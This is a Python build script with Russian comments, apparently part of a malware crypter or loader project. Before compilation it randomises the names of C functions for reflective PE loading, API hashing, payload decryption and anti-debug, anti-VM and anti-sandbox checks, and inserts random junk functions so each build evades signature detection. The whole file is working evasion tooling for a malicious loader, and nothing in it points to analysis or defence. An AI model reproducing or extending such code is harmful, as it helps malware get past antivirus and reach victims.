# core/polymorph.py
# Полиморфизм: рандомизация имён функций/переменных, junk-функции.
# Работает на этапе сборки: перед gcc копирует src/ в build/poly_src/,
# заменяет идентификаторы, добавляет junk-код.

import os
import re
import sys
import random
import string
import shutil
from pathlib import Path


# ============================================================
# Генерация случайных имён
# ============================================================
_name_counter = [0]

def random_name(prefix: str = "f") -> str:
    """Случайное имя: буква + 7 символов."""
    _name_counter[0] += 1
    chars = string.ascii_letters
    name = random.choice(string.ascii_lowercase)
    for _ in range(7):
        name += random.choice(chars)
    return name


# ============================================================
# Что переименовываем
# ============================================================
# Словарь: оригинальное имя → рандомное имя.
# Заполняется ОДИН раз в начале полиморфа, потом применяется ко ВСЕМ файлам.
RENAME_MAP = {}


# Функции, которые переименовываем (не трогаем имена WinAPI!)
# Функции, которые переименовываем (не трогаем имена WinAPI!)
# ВАЖНО: loader_entry НЕ ВКЛЮЧАЕМ — это entry point для линкера.
FUNCS_TO_RENAME = [
   
    # loader
    "read_file", "map_pe_to_memory", "alloc_image", "protect_image",
    # api_resolver
    "get_peb", "get_module_base_by_name", "resolve_api_by_hash",
    "resolve_kernel32", "resolve_ntdll", "resolve_user32", "resolve_ws2_32",
    "api_hash", "unicode_equals_ascii_ci",
    # pe_parser
    "pe_parse", "pe_is_valid", "pe_rva_to_ptr",
    "pe_get_directory", "pe_first_section", "pe_section_at",
    # reflective
    "reflective_load", "reflective_resolve_imports", "reflective_apply_relocations",
    "resolve_import_func", "load_dll_by_name",
    # decrypt
    "decrypt_payload", "xor_decrypt", "rc4_decrypt",
    # antianalysis
    "anti_analysis_check", "is_debugger_present", "is_vm", "is_sandbox",
    "check_cpuid_hypervisor", "check_cpuid_vendor", "check_peb_debugged",
    "check_is_debugger_present", "check_low_ram", "check_low_cpu",
    "check_username", "check_low_uptime", "check_low_disk",
    "cpu_id", "log_anti",
    # common
    "bs_memcpy", "bs_memset", "bs_memcmp",
    
]


# Глобальные переменные, которые переименовываем
GLOBALS_TO_RENAME = []

# Ещё имена, которые встречаются в коде как "статические"
# (static функции — тоже переименовываем)
# Но НЕ трогаем: WinAPI, типы (u8, u32), ключевые слова C.


# ============================================================
# Инициализация RENAME_MAP
# ============================================================
def build_rename_map():
    """Создаёт случайные имена для всех функций и глобалов."""
    for name in FUNCS_TO_RENAME:
        RENAME_MAP[name] = random_name("fn_")

    for name in GLOBALS_TO_RENAME:
        RENAME_MAP[name] = random_name("g_")

    # Также переименуем системные длл имена — но не так тривиально
    # (это сложнее, оставим на потом)


# ============================================================
# Замена идентификаторов в тексте файла
# ============================================================
def apply_renames(text: str) -> str:
    """Заменяет все известные идентификаторы по RENAME_MAP."""
    # Сортируем по убыванию длины — чтобы не было частичных совпадений
    # (например, "resolve_kernel32" и "resolve_kernel32_ex")
    for old in sorted(RENAME_MAP.keys(), key=len, reverse=True):
        new = RENAME_MAP[old]
        # Заменяем как отдельное слово (\b = word boundary)
        text = re.sub(rf"\b{re.escape(old)}\b", new, text)
    return text


# ============================================================
# Генерация junk-функций
# ============================================================
def generate_junk_functions(count: int = 5) -> str:
    """Создаёт рандомные бесполезные функции."""
    out = []
    out.append("\n// === Junk functions ===")
    for i in range(count):
        name = random_name("junk_")
        # Случайное тело: арифметика + volatile
        ops = random.choice([
            f"volatile u32 x = {random.randint(1, 1000)};\n"
            f"    for (u32 i = 0; i < {random.randint(3, 20)}; i++) x = x * {random.randint(2, 7)} + i;\n"
            f"    return x;",
            f"volatile u64 y = {random.randint(1000, 100000)};\n"
            f"    y ^= (y << {random.randint(3, 12)});\n"
            f"    y ^= (y >> {random.randint(3, 12)});\n"
            f"    return (u32)y;",
            f"volatile u32 a = {random.randint(1, 100)}, b = {random.randint(1, 100)};\n"
            f"    u32 r = 0;\n"
            f"    for (u32 i = 0; i < {random.randint(5, 30)}; i++) r += (a ^ b) * i;\n"
            f"    return r;",
        ])
        out.append(f"static u32 {name}(void) {{\n    {ops}\n}}\n")
    return "\n".join(out)


# ============================================================
# Основная функция полиморфа
# ============================================================
def process_file(src_path: Path, dst_path: Path, add_junk: bool = False):
    """Обрабатывает один C/H файл."""
    text = src_path.read_text(encoding="utf-8")

    # 1. Заменяем идентификаторы
    text = apply_renames(text)

    # 2. Добавляем junk-функции в конец .c файла (не .h)
    if add_junk and src_path.suffix == ".c":
        # Ищем последнюю "}" — но лучше просто добавить в конец файла
        text += "\n" + generate_junk_functions(random.randint(3, 8))
        # Также вызовем одну из них, чтобы компилятор не выкинул
        # (но вызывать не будем — оставим неиспользуемые, компилятор выкинет,
        #  зато исходник отличается)

    dst_path.parent.mkdir(parents=True, exist_ok=True)
    dst_path.write_text(text, encoding="utf-8")


def polymorph_project(src_dir: Path, dst_dir: Path):
    """
    Обрабатывает весь проект: копирует src/ в dst/, применяет полиморф.
    Возвращает количество обработанных файлов.
    """
    # 1. Инициализируем RENAME_MAP
    build_rename_map()

    # 2. Считаем файлы
    c_files = list(src_dir.rglob("*.c"))
    h_files = list(src_dir.rglob("*.h"))

    if not c_files:
        print(f"[!] No .c files found in {src_dir}")
        return 0

    # 3. Очищаем dst
    if dst_dir.exists():
        shutil.rmtree(dst_dir)
    dst_dir.mkdir(parents=True, exist_ok=True)

    # 4. Обрабатываем каждый файл
    total = 0
    for src_file in c_files + h_files:
        rel = src_file.relative_to(src_dir)
        dst_file = dst_dir / rel
        add_junk = src_file.suffix == ".c" and src_file.name not in (
            "payload_data.c",  # это автогенерированный файл
        )
        process_file(src_file, dst_file, add_junk=add_junk)
        total += 1

    return total


# ============================================================
# Точка входа для отладки
# ============================================================
if __name__ == "__main__":
    project_root = Path(__file__).parent.parent.resolve()
    src = project_root / "src"
    dst = project_root / "build" / "poly_src"
    n = polymorph_project(src, dst)
    print(f"[+] Polymorphed {n} files into {dst}")
    print(f"[*] Rename map:")
    for old, new in sorted(RENAME_MAP.items()):
        print(f"    {old} -> {new}")